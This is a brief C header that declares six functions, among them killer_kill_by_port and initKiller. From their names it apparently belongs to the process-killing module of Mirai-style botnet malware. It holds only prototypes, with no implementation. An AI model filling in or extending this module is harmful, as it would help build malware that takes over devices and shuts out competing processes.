#pragma once

#include "includes.h"

BOOL killer_kill_by_port(port_t);
void initKiller(int, char *);
char validateMnt();
void checkDevice();
void mntdir(int);
void goodbyeee();

